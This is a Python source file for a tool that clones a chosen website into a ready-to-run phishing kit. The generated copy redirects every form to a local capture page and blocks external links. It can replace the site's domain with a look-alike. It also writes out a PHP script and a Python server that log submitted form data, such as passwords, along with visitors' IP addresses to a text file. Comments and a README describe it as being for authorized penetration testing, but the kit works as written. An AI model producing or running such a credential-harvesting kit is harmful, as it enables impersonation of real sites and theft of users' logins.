import os
import re
import requests
from urllib.parse import urljoin, urlparse, parse_qs
from pathlib import Path
from bs4 import BeautifulSoup
import time
import mimetypes

class WebScraper:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        self.downloaded_assets = set()
        self.base_url = None
        self.target_domain = None
    
    def normalize_url(self, url):
        if url.startswith('//'):
            return f"https:{url}"
        elif url.startswith('/'):
            return urljoin(self.base_url, url)
        elif not url.startswith(('http://', 'https://')):
            return urljoin(self.base_url, url)
        return url
    
    def download_asset(self, url, output_dir):
        try:
            normalized_url = self.normalize_url(url)
            
            if normalized_url in self.downloaded_assets:
                return self.get_local_path(normalized_url, output_dir)
            
            response = self.session.get(normalized_url, timeout=10, stream=True)
            response.raise_for_status()
            
            parsed_url = urlparse(normalized_url)
            local_path = self.get_local_path(normalized_url, output_dir)
            
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            
            with open(local_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            self.downloaded_assets.add(normalized_url)
            return local_path
            
        except Exception as e:
            print(f"Failed to download {url}: {e}")
            return None
    
    def get_local_path(self, url, output_dir):
        parsed_url = urlparse(url)
        path = parsed_url.path.lstrip('/')
        
        if not path or path.endswith('/'):
            path += 'index.html'
        
        if '.' not in os.path.basename(path):
            path += '.html'
        
        return os.path.join(output_dir, 'assets', path)
    
    def get_relative_path(self, url, output_dir):
        local_path = self.get_local_path(url, output_dir)
        return os.path.relpath(local_path, output_dir)
    
    def modify_html_content(self, soup, output_dir, target_domain_replacement=None):
        # Download and replace CSS files
        for link in soup.find_all('link', {'rel': 'stylesheet'}):
            if link.get('href'):
                local_path = self.download_asset(link['href'], output_dir)
                if local_path:
                    link['href'] = self.get_relative_path(link['href'], output_dir)
        
        # Download and replace JavaScript files
        for script in soup.find_all('script', src=True):
            local_path = self.download_asset(script['src'], output_dir)
            if local_path:
                script['src'] = self.get_relative_path(script['src'], output_dir)
        
        # Download and replace images
        for img in soup.find_all('img', src=True):
            local_path = self.download_asset(img['src'], output_dir)
            if local_path:
                img['src'] = self.get_relative_path(img['src'], output_dir)
        
        # Handle background images in style attributes
        for element in soup.find_all(style=True):
            style = element['style']
            if 'background-image' in style or 'background:' in style:
                # Extract URLs from CSS
                url_pattern = r'url\(["\']?([^"\']+)["\']?\)'
                matches = re.findall(url_pattern, style)
                for match in matches:
                    local_path = self.download_asset(match, output_dir)
                    if local_path:
                        relative_path = self.get_relative_path(match, output_dir)
                        style = style.replace(match, relative_path)
                element['style'] = style
        
        # Modify forms to capture data (for phishing simulation)
        for form in soup.find_all('form'):
            # Store original action for reference
            original_action = form.get('action', '')
            
            # Add hidden field to track original action
            hidden_input = soup.new_tag('input', type='hidden', name='original_action', value=original_action)
            form.append(hidden_input)
            
            # Change form action to local handler
            form['action'] = '/capture.php'
            form['method'] = 'post'
        
        # Modify links to prevent navigation away from cloned site
        for link in soup.find_all('a', href=True):
            href = link['href']
            parsed_href = urlparse(href)
            
            # If it's an external link, modify it
            if parsed_href.netloc and parsed_href.netloc != self.target_domain:
                link['href'] = '#'
                link['onclick'] = f"alert('External link blocked: {href}'); return false;"
            elif parsed_href.netloc == self.target_domain and target_domain_replacement:
                # Replace with cloned domain
                link['href'] = href.replace(self.target_domain, target_domain_replacement)
        
        # Replace domain references in text content if replacement is provided
        if target_domain_replacement:
            text_elements = soup.find_all(text=True)
            for element in text_elements:
                if self.target_domain in str(element):
                    new_text = str(element).replace(self.target_domain, target_domain_replacement)
                    element.replace_with(new_text)
        
        return soup
    
    def download_css_assets(self, css_content, css_url, output_dir):
        # Find URLs in CSS content
        url_pattern = r'url\(["\']?([^"\']+)["\']?\)'
        matches = re.findall(url_pattern, css_content)
        
        for match in matches:
            absolute_url = urljoin(css_url, match)
            local_path = self.download_asset(absolute_url, output_dir)
            if local_path:
                relative_path = self.get_relative_path(absolute_url, output_dir)
                css_content = css_content.replace(match, relative_path)
        
        return css_content
    
    def clone_website(self, target_url, output_dir):
        try:
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            self.base_url = target_url
            parsed_url = urlparse(target_url)
            self.target_domain = parsed_url.netloc
            
            print(f"Fetching main page: {target_url}")
            response = self.session.get(target_url, timeout=15)
            response.raise_for_status()
            
            # Create output directory
            os.makedirs(output_dir, exist_ok=True)
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Modify HTML content and download assets
            modified_soup = self.modify_html_content(soup, output_dir)
            
            # Save main HTML file
            main_html_path = os.path.join(output_dir, 'index.html')
            with open(main_html_path, 'w', encoding='utf-8') as f:
                f.write(str(modified_soup))
            
            # Create a simple capture script for form data
            self.create_capture_script(output_dir)
            
            # Create a simple web server script
            self.create_server_script(output_dir)
            
            print(f"Website cloned successfully to: {output_dir}")
            return True
            
        except Exception as e:
            print(f"Error cloning website: {e}")
            return False
    
    def create_capture_script(self, output_dir):
        capture_script = '''<?php
// Simple form data capture script for penetration testing
// WARNING: This is for authorized security testing only!

$log_file = 'captured_data.txt';
$timestamp = date('Y-m-d H:i:s');

// Log all POST data
if ($_POST) {
    $data = "\\n=== FORM SUBMISSION - $timestamp ===\\n";
    $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
    $data .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
    $data .= "Referrer: " . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct') . "\\n";
    
    foreach ($_POST as $key => $value) {
        $data .= "$key: $value\\n";
    }
    
    $data .= "================\\n";
    
    file_put_contents($log_file, $data, FILE_APPEND | LOCK_EX);
}

// Redirect to a "success" page or back to main page
header('Location: index.html');
exit;
?>'''
        
        capture_path = os.path.join(output_dir, 'capture.php')
        with open(capture_path, 'w') as f:
            f.write(capture_script)
    
    def create_server_script(self, output_dir):
        server_script = '''#!/usr/bin/env python3
"""
Simple HTTP server for hosting cloned website
For authorized penetration testing only!
"""

import http.server
import socketserver
import os
import sys

PORT = 8080

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        # Handle form submissions
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Log the data
        with open('captured_data.txt', 'a') as f:
            f.write(f"\\n=== FORM SUBMISSION ===\\n")
            f.write(f"Data: {post_data.decode('utf-8')}\\n")
            f.write("================\\n")
        
        # Redirect back to main page
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
        print(f"Serving cloned website at http://localhost:{PORT}")
        print("Press Ctrl+C to stop the server")
        print("WARNING: This is for authorized security testing only!")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\\nServer stopped.")
'''
        
        server_path = os.path.join(output_dir, 'serve.py')
        with open(server_path, 'w') as f:
            f.write(server_script)
        
        # Make it executable
        os.chmod(server_path, 0o755)
        
        # Create README for the cloned site
        readme_content = '''# Cloned Website for Penetration Testing

## WARNING
This cloned website is for authorized security testing only!
Only use this in environments where you have explicit permission to conduct penetration testing.

## Files
- `index.html` - Main cloned website
- `capture.php` - PHP script to capture form submissions (requires PHP server)
- `serve.py` - Python HTTP server for testing
- `assets/` - Downloaded CSS, JS, images and other assets

## Running the Server

### Python Server (recommended for testing)
```bash
python3 serve.py
```

### PHP Server (for form capture functionality)
```bash
php -S localhost:8080
```

## Captured Data
Form submissions will be logged to `captured_data.txt`

## Legal Notice
This tool is designed for authorized penetration testing and security research only.
Users are responsible for ensuring they have proper authorization before using this tool.
Unauthorized use may violate computer fraud and abuse laws.
'''
        
        readme_path = os.path.join(output_dir, 'README.md')
        with open(readme_path, 'w') as f:
            f.write(readme_content)